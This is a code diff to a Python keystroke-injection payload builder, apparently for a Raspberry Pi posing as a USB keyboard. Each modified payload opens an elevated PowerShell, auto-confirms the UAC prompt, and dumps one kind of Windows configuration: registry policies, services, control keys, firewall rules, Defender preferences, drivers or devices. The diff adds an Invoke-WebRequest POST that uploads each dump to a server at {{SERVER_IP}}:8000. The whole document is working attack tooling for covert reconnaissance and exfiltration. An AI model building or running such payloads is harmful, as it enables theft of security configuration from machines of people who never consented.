@@ -76,16 +76,17 @@ class PayloadBuilder:
         # Registry export - Policies (Works on Home)
         self.payloads['export_policies'] = {
             'name': 'Export Registry Policies',
-            'description': 'Exports HKLM and HKCU Policies to C: (Elevated)',
+            'description': 'Exports HKLM Policies and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y'},
+                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKLM_Policies.reg -Headers @{"X-Filename"="HKLM_Policies.reg"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -95,16 +96,17 @@ class PayloadBuilder:
         
         self.payloads['export_user_policies'] = {
             'name': 'Export User Policies',
-            'description': 'Exports HKCU Policies to C: (Elevated)',
+            'description': 'Exports HKCU Policies and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y'},
+                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKCU_Policies.reg -Headers @{"X-Filename"="HKCU_Policies.reg"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -115,16 +117,17 @@ class PayloadBuilder:
         # Registry export - Services (Works on Home)
         self.payloads['export_services'] = {
             'name': 'Export Services Registry',
-            'description': 'Exports Services registry to C: (Elevated)',
+            'description': 'Exports Services and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Services.reg -Headers @{"X-Filename"="Services.reg"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 3000},
                 {'action': 'type', 'text': 'exit'},
@@ -135,16 +138,17 @@ class PayloadBuilder:
         # Registry export - Control (Works on Home)
         self.payloads['export_control'] = {
             'name': 'Export Control Registry',
-            'description': 'Exports Control registry to C: (Elevated)',
+            'description': 'Exports Control and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y'},
+                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Control.reg -Headers @{"X-Filename"="Control.reg"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 3000},
                 {'action': 'type', 'text': 'exit'},
@@ -155,16 +159,17 @@ class PayloadBuilder:
         # Firewall export (Works on Home)
         self.payloads['export_firewall'] = {
             'name': 'Export Firewall Config',
-            'description': 'Exports firewall configuration to C: (Elevated)',
+            'description': 'Exports firewall and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw'},
+                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\firewall.wfw -Headers @{"X-Filename"="firewall.wfw"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -175,7 +180,7 @@ class PayloadBuilder:
         # Defender settings (Works on Home)
         self.payloads['export_defender'] = {
             'name': 'Export Defender Settings',
-            'description': 'Exports Windows Defender preferences to JSON (Elevated)',
+            'description': 'Exports Defender and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
@@ -184,7 +189,8 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 > C:\\defender.json'},
+                {'action': 'type', 'text': 'Get-MpPreference|ConvertTo-Json -Depth 5>C:\\defender.json;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\defender.json -Headers @{"X-Filename"="defender.json"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
@@ -195,16 +201,17 @@ class PayloadBuilder:
         # Driver enumeration (Works on Home)
         self.payloads['export_drivers'] = {
             'name': 'Export Driver List',
-            'description': 'Exports installed drivers to C: (Elevated)',
+            'description': 'Exports drivers and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'pnputil /enum-drivers > C:\\drivers.txt'},
+                {'action': 'type', 'text': 'pnputil /enum-drivers>C:\\drivers.txt;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\drivers.txt -Headers @{"X-Filename"="drivers.txt"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 3000},
                 {'action': 'type', 'text': 'exit'},
@@ -215,16 +222,17 @@ class PayloadBuilder:
         # Device enumeration (Works on Home)
         self.payloads['export_devices'] = {
             'name': 'Export Device List',
-            'description': 'Exports device list to C: (Elevated)',
+            'description': 'Exports devices and uploads to Pi',
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'cmd'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'pnputil /enum-devices > C:\\devices.txt'},
+                {'action': 'type', 'text': 'pnputil /enum-devices>C:\\devices.txt;'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\devices.txt -Headers @{"X-Filename"="devices.txt"}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 3000},
                 {'action': 'type', 'text': 'exit'},
